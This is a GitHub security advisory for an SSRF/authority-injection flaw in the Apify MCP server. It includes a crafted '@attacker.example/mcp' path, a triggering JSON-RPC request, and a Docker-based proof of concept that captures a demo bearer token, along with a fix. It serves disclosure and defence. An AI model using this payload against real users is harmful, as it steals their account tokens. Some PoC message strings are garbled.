# [H] Apify Model Context Protocol (MCP) server: Actor MCP path authority injection leaks Apify token

## Summary
Severity: High
Advisory: GHSA-6gr2-qh89-hxwm
CVE: CVE-2026-50143
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-01
Source: https://github.com/advisories/GHSA-6gr2-qh89-hxwm
Type: github-advisory

## Affected
- npm: `@apify/actors-mcp-server` — affected >=0 <0.10.11

## Details
## Actor MCP path authority injection leaks Apify token

### Summary

`@apify/actors-mcp-server` version `0.10.7` builds Actor standby URLs by directly concatenating a trusted base URL with an attacker-controlled `webServerMcpPath` value taken from an Actor definition returned by the Apify API. An attacker who publishes a malicious Actor with a crafted `webServerMcpPath` (e.g., `@attacker.example/mcp`) can cause the MCP client to resolve the final URL to an entirely different host. Because the MCP client unconditionally attaches the victim's `Authorization: Bearer <APIFY_TOKEN>` header to every outbound connection, the victim's Apify API token is exfiltrated to the attacker's server. CVSS Base Score: **8.1 (High)**.

### Details

`getActorMCPServerURL()` in `src/mcp/actors.ts:44` constructs the Actor standby MCP URL by naive string concatenation:

```ts
// src/mcp/actors.ts:44
return `${standbyUrl}${mcpServerPath}`;
```

`mcpServerPath` originates from the `webServerMcpPath` field of an Actor definition fetched from the Apify API (`src/utils/actor.ts:24-28`). The field is trimmed and comma-split in `getActorMCPServerPath()` (`src/mcp/actors.ts:14-20`) but is never validated to:

- begin with a `/` (relative path),
- avoid an `@` character (userinfo/authority injection), or
- resolve to the same origin as `standbyUrl`.

When `webServerMcpPath` is set to `@attacker.example/mcp`, the concatenated result becomes:

```
https://real-actor-id.apify.actor@attacker.example/mcp
```

Node.js's WHATWG URL parser treats everything before `@` as userinfo and extracts `attacker.example` as the hostname. This is not an edge-case browser behavior — it is specified by RFC 3986 and the WHATWG URL standard.

The constructed URL is forwarded to `connectMCPClient()` through three independent code paths:

| Call site | Trigger |
|---|---|
| `src/tools/core/call_actor_common.ts:317` | `call-actor` MCP tool |
| `src/utils/actor_details.ts:155` | `fetch-actor-details` MCP tool |
| `src/mcp/server.ts:1047` | actor-mcp type tool loading |

`connectMCPClient()` (`src/mcp/client.ts`) attaches the victim's Apify token as a bearer credential to every transport type:

```ts
// src/mcp/client.ts:94  — SSEClientTransport requestInit
authorization: `Bearer ${token}`,

// src/mcp/client.ts:103 — SSE fetch callback
headers.set('authorization', `Bearer ${token}`);

// src/mcp/client.ts:124 — StreamableHTTPClientTransport requestInit
authorization: `Bearer ${token}`,
```

There is no origin check anywhere between URL construction and the outbound HTTP request.

**Full data-flow chain:**

1. `src/mcp/server.ts:811` — MCP `tools/call` request parameters are read.
2. `src/mcp/server.ts:816` — `apifyToken` is resolved from `_meta.apifyToken`, server options, or `process.env.APIFY_TOKEN`.
3. `src/tools/core/call_actor_common.ts:489-497` — attacker-controlled `actor` identifier is resolved via `getActorMcpUrlCached()`.
4. `src/utils/actor.ts:24-28` — Actor definition is fetched from the Apify API; `webServerMcpPath` is passed to `getActorMCPServerURL()`.
5. `src/mcp/actors.ts:14-20` — `webServerMcpPath` is trimmed and split; first element is returned without path validation.
6. `src/mcp/actors.ts:44` — `standbyUrl + mcpServerPath` produces an authority-injected URL.
7. `connectMCPClient()` is called with the injected URL and the victim's token.
8. `src/mcp/client.ts:94/103/124` — `Authorization: Bearer <APIFY_TOKEN>` is sent to the attacker's host.

### PoC

**Environment requirements:**

- Docker (network-isolated container; no external network access needed)
- The repository at commit `4e2b185` checked out under the build context

**Build and run:**

```bash
# Build the exploit image (from the mcp_38_apify__actors-mcp-server/ context directory)
docker build -t vuln-001-poc \
  -f vuln-001/Dockerfile \
  /path/to/mcp_38_apify__actors-mcp-server

# Run the exploit (--network none: fully air-gapped)
docker run --rm --network none vuln-001-poc
```

The Dockerfile:
1. Generates a self-signed TLS certificate for `127.0.0.1` (IP SAN required for Node.js TLS validation).
2. Installs `@apify/actors-mcp-server@0.10.7` dependencies under `pnpm`.
3. Sets `NODE_EXTRA_CA_CERTS` so Node.js trusts the self-signed CA.
4. Runs `exploit.mjs`, which:
   - Starts an HTTPS capture server on `127.0.0.1:31337`.
   - Constructs a `webServerMcpPath` of `@127.0.0.1:31337/mcp`.
   - Calls `getActorMCPServerURL()` directly, producing `https://apify~hello-world.apify.actor@127.0.0.1:31337/mcp`.
   - Calls `connectMCPClient()` with a simulated victim token (`apify_api_VICTIM_SECRET_TOKEN_DEMO_12345`).
   - Asserts that the capture server received `Authorization: Bearer apify_api_VICTIM_SECRET_TOKEN_DEMO_12345`.

**Observed output (Phase 2 evidence):**

```
  parsed.hostname        : 127.0.0.1
[PASS] URL injection confirmed: request will be sent to 127.0.0.1:31337
=== STEP 2: attacker HTTPS server received request ===
  Authorization     : Bearer apify_api_VICTIM_SECRET_TOKEN_DEMO_12345
=== RESULT: EXPLOIT SUCCESSFUL ===
[PROOF] Victim token "Bearer apify_api_VICTIM_SECRET_TOKEN_DEMO_12345" arrived at attacker server 127.0.0.1:31337
```

**Alternative MCP request path (real-world scenario):**

A victim running `@apify/actors-mcp-server` connected to an MCP host sends the following request, where `attacker/malicious-mcp` is an Actor published with `webServerMcpPath = "@attacker.example/mcp"`:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "fetch-actor-details",
    "arguments": {
      "actor": "attacker/malicious-mcp",
      "output": { "mcpTools": true }
    },
    "_meta": { "mcpSessionId": "poc-session" }
  }
}
```

The attacker's server at `attacker.example` receives:

```
Authorization: Bearer apify_api_victim_token
```

**URL parser primitive (Node.js REPL verification):**

```
node -e "const u=new URL('https://ABC.apify.actor@127.0.0.1:31337/mcp'); console.log(u.hostname, u.username)"
# Output: 127.0.0.1  ABC.apify.actor
```

**Recommended fix:**

```diff
--- a/src/mcp/actors.ts
+++ b/src/mcp/actors.ts
 export async function getActorMCPServerURL(realActorId: string, mcpServerPath: string): Promise<string> {
     const standbyUrl = await getActorStandbyURL(realActorId, standbyBaseUrl);
-    return `${standbyUrl}${mcpServerPath}`;
+    const url = new URL(mcpServerPath, `${standbyUrl}/`);
+    if (url.origin !== standbyUrl) {
+        throw new Error('Actor MCP server path must resolve under the Actor standby URL');
+    }
+    url.username = '';
+    url.password = '';
+    return url.toString();
 }
```

### Impact

Any user of `@apify/actors-mcp-server` who:

1. has an Apify API token configured (via `APIFY_TOKEN`, server options, or `_meta.apifyToken`), and
2. is induced to invoke `call-actor`, `fetch-actor-details`, or any actor-mcp type tool against an attacker-controlled Actor,

will have their **Apify API token silently exfiltrated** to the attacker's server. The Apify API token grants full access to the victim's Apify account, including running and managing Actors, accessing stored data, and incurring compute charges. The attack requires no special privileges on the victim's side and no code execution on the victim's machine — only a crafted Actor definition on the Apify platform.

This is a **Server-Side Request Forgery (SSRF) / URL authority injection** vulnerability. The attacker redirects the MCP client's outbound connection to an arbitrary host while the client continues to send the victim's credential.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM node:24-slim

# ─── system packages ───────────────────────────────────────────────────────────
RUN apt-get update && apt-get install -y --no-install-recommends openssl python3 \
 && rm -rf /var/lib/apt/lists/*

# ─── self-signed TLS cert for the attacker capture server (127.0.0.1) ─────────
# IP SAN required: Node.js rejects certs without SAN matching the requested hostname.
RUN mkdir /certs && \
 openssl req -x509 -newkey rsa:2048 \
 -keyout /certs/key.pem -out /certs/cert.pem \
 -days 1 -nodes \
 -subj '/CN=127.0.0.1' \
 -addext 'subjectAltName=IP:127.0.0.1' \
 2>/dev/null

# ─── vulnerable package ────────────────────────────────────────────────────────
WORKDIR /app
COPY repo/ ./

# pnpm@11 is pinned in devEngines; npm/yarn refuse to run inside this checkout.
RUN npm install -g pnpm@11.1.3 --quiet 2>/dev/null

# Install only production deps — build output not needed; exploit imports from source via tsx.
# --frozen-lockfile validates the lockfile is up-to-date with package.json.
RUN pnpm install --frozen-lockfile

# ─── exploit files ─────────────────────────────────────────────────────────────
COPY vuln-001/exploit.mjs /exploit.mjs

# Trust our self-signed CA so both undici/fetch and node:https accept TLS connections to 127.0.0.1.
ENV NODE_EXTRA_CA_CERTS=/certs/cert.pem

CMD ["node", "/exploit.mjs"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
VULN-001 dynamic PoC driver.

Builds the Docker image, runs the exploit container, collects observable evidence,
and writes phase2_result.json with the outcome.
"""
import json
import os
import subprocess
import sys
import textwrap

# ─── paths ────────────────────────────────────────────────────────────────────
THIS_DIR    = os.path.dirname(os.path.abspath(__file__))          # vuln-001/
CONTEXT_DIR = os.path.dirname(THIS_DIR)                           # mcp_38_apify__actors-mcp-server/
DOCKERFILE  = os.path.join(THIS_DIR, 'Dockerfile')
RESULT_PATH = os.path.join(THIS_DIR, 'phase2_result.json')
IMAGE_TAG   = 'vuln-001-poc'

BUILD_CMD = ['docker', 'build', '-t', IMAGE_TAG, '-f', DOCKERFILE, CONTEXT_DIR]
RUN_CMD   = ['docker', 'run', '--rm', '--network', 'none', IMAGE_TAG]


def run(cmd, *, timeout, **kwargs):
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, **kwargs)


def write_result(payload: dict):
    with open(RESULT_PATH, 'w') as f:
        json.dump(payload, f, indent=2, ensure_ascii=False)
    print(f'\n[*] phase2_result.json write complete: {RESULT_PATH}')


def main():
    print('=' * 70)
    print('VULN-001 dynamic reproduction — Actor MCP path authority injection')
    print('=' * 70)

    # ── 1. Docker build ───────────────────────────────────────────────────────
    print(f'\n[1/2] building Docker image...')
    print(f'      command: {" ".join(BUILD_CMD)}')
    build = run(BUILD_CMD, timeout=600)
    if build.returncode != 0:
        msg = build.stderr[-2000:] if build.stderr else build.stdout[-2000:]
        print('[!] build failed:\n', msg)
        write_result({
            'passed': False,
            'verdict': 'FAIL',
            'reason': f'Docker build failed. error: {msg[:500]}',
            'build_command': ' '.join(BUILD_CMD),
            'run_command': ' '.join(RUN_CMD),
            'poc_command': f'python3 {os.path.relpath(__file__)}',
            'evidence': msg[:1000],
            'artifacts': ['Dockerfile', 'exploit.mjs', 'poc.py'],
        })
        sys.exit(1)
    print('[+] build succeeded')

    # ── 2. Docker run ─────────────────────────────────────────────────────────
    print(f'\n[2/2] text while running the container...')
    print(f'      command: {" ".join(RUN_CMD)}')
    try:
        run_result = run(RUN_CMD, timeout=120)
    except subprocess.TimeoutExpired:
        write_result({
            'passed': False,
            'verdict': 'INCOMPLETE',
            'reason': 'container execution 120seconds timeout. text text or TLS handshake issuetext can exists.',
            'build_command': ' '.join(BUILD_CMD),
            'run_command': ' '.join(RUN_CMD),
            'poc_command': f'python3 {os.path.relpath(__file__)}',
            'evidence': 'timeout',
            'artifacts': ['Dockerfile', 'exploit.mjs', 'poc.py'],
        })
        sys.exit(1)

    stdout = run_result.stdout
    stderr = run_result.stderr
    print('\n--- container stdout ---')
    print(stdout)
    if stderr:
        print('--- container stderr (text 1000characters) ---')
        print(stderr[:1000])

    # ── 3. result verdict ──────────────────────────────────────────────────────────
    passed = (
        run_result.returncode == 0
        and 'attacker HTTPS server received request' in stdout
        and 'EXPLOIT SUCCESSFUL' in stdout
        and 'apify_api_VICTIM_SECRET_TOKEN_DEMO_12345' in stdout
    )

    # Build evidence excerpt (key lines only)
    evidence_lines = [l for l in stdout.splitlines()
                      if any(k in l for k in ['PASS', 'PROOF', 'received request',
                                               'EXPLOIT', 'parsed.hostname', 'Authorization'])]
    evidence = '\n'.join(evidence_lines[:20]) if evidence_lines else stdout[-1500:]

    if passed:
        print('\n[✓] PASS — token leak vulnerability dynamic reproduction success')
        write_result({
            'passed': True,
            'verdict': 'PASS',
            'reason': (
                'Docker container withintext vulnerabilitytext fully reproductiondone. '
                'actors.ts:44text `${standbyUrl}${mcpServerPath}` string text '
                '`@127.0.0.1:31337/mcp` formtext mcpServerPathtext textdo '
                '`https://apify~hello-world.apify.actor@127.0.0.1:31337/mcp` URLtext createand, '
                'Node.js URL text hostnametext 127.0.0.1(attacker server)text dotextdo '
                'client.ts:94text `Authorization: Bearer <APIFY_TOKEN>` headertext attacker HTTPS servertext beforetextdone.'
            ),
            'build_command': ' '.join(BUILD_CMD),
            'run_command': ' '.join(RUN_CMD),
            'poc_command': f'python3 poc.py',
            'evidence': evidence,
            'artifacts': ['Dockerfile', 'exploit.mjs', 'poc.py'],
        })
    else:
        reason_detail = ''
        if run_result.returncode != 0:
            reason_detail = f'container exit code {run_result.returncode}. '
        if 'TOKEN_CAPTURED' not in stdout:
            reason_detail += 'attacker serverfrom token capture text textnot not. '
        if 'EXPLOIT SUCCESSFUL' not in stdout:
            reason_detail += 'final success message none. '

        print(f'\n[✗] FAIL — {reason_detail}')
        write_result({
            'passed': False,
            'verdict': 'FAIL',
            'reason': f'failed to reproduce the vulnerability. {reason_detail}stderr: {stderr[:300]}',
            'build_command': ' '.join(BUILD_CMD),
            'run_command': ' '.join(RUN_CMD),
            'poc_command': f'python3 poc.py',
            'evidence': stdout[-2000:] + ('\nSTDERR: ' + stderr[:500] if stderr else ''),
            'artifacts': ['Dockerfile', 'exploit.mjs', 'poc.py'],
        })
        sys.exit(1)


if __name__ == '__main__':
    main()
```

## References
- https://github.com/apify/apify-mcp-server/security/advisories/GHSA-6gr2-qh89-hxwm
- https://github.com/apify/apify-mcp-server
